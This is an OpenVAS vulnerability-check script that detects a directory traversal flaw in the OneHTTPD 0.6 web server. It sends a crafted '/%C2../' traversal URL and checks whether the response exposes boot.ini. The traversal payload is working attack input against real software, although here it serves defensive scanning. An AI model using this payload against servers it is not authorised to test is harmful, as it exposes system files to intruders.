###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_OneHTTPD_39757.nasl 8447 2018-01-17 16:12:19Z teissa $
#
# OneHTTPD Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "OneHTTPD is prone to a directory-traversal vulnerability because it
fails to sufficiently sanitize user-supplied input data.

Exploiting the issue may allow an attacker to obtain sensitive
information that could aid in further attacks.

OneHTTPD 0.6 is vulnerable; other versions may also be affected.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100620");
 script_version("$Revision: 8447 $");
 script_tag(name:"last_modification", value:"$Date: 2018-01-17 17:12:19 +0100 (Wed, 17 Jan 2018) $");
 script_tag(name:"creation_date", value:"2010-05-04 12:32:13 +0200 (Tue, 04 May 2010)");
 script_bugtraq_id(39757);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_name("OneHTTPD Directory Traversal Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/39757");
 script_xref(name : "URL" , value : "http://code.google.com/p/onehttpd");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web Servers");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("gb_get_http_banner.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("onehttpd/banner");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if(!banner || "Server: onehttpd" >!< banner)exit(0);

url = string("/%C2../%C2../%C2../%C2../%C2../%C2../%C2../%C2../");

if(http_vuln_check(port:port, url:url,pattern:"boot\.ini")) {
  security_message(port:port);
  exit(0);
}

exit(0);
